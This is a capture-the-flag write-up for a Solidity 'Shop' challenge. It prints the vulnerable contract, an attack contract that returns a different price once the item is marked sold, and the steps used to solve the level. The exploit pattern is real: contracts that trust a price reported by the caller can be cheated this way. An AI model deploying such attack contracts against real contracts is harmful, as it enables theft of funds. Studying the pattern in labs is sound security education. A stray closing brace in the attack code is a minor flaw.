# Task

Сan you get the item from the shop for less than the price asked?

# Contract

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

What we need to do is 

1. set `isSold` to true
2. set `price` < 100

Below is the attack contract

```sol
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./shop.sol";

contract shopAttack is Buyer{
    Shop public buyer;

    constructor(address _targetaddr) {
        buyer = Shop(_targetaddr);
    }

    function buy() public {
        buyer.buy();
    }

    function price() public view override returns(uint) { 
        if (buyer.isSold()) {
            return 0;
        } else {
            return 100;
        }

        // the if statement can be written in a shorter form
        // return buyer.isSold() ? 0 :100;
    }
}


}
```
We can compile this using forge

![image](https://github.com/user-attachments/assets/855d39bb-f7ed-4c31-8725-27afc906aa51)

We've successfully compiled the attack contract and we got the contract address to be `0xb1b1d2b475d99c93d6D1c7AD1303B3C3a1BF134f`

Lets start out by calling the `price()` function in the attack contract

![image](https://github.com/user-attachments/assets/c9cc99f1-8ee7-4cfd-8898-3810f1d7b562)

We have the value of `100`

To pass the if conditional statement, we'll call the `buy()` function

![image](https://github.com/user-attachments/assets/059061ca-7da0-4004-9f70-565e56dcbaea)

Now, lets call the `price()` function again

![image](https://github.com/user-attachments/assets/17e15167-c75a-479b-91bf-b012223d9a4a)

Our price already reset to zero

Submitting the instance

![image](https://github.com/user-attachments/assets/9fb3c454-c19b-4662-9014-fd5990399aac)

We have successfully completed this level

-------------------------

Till Next Time :xD























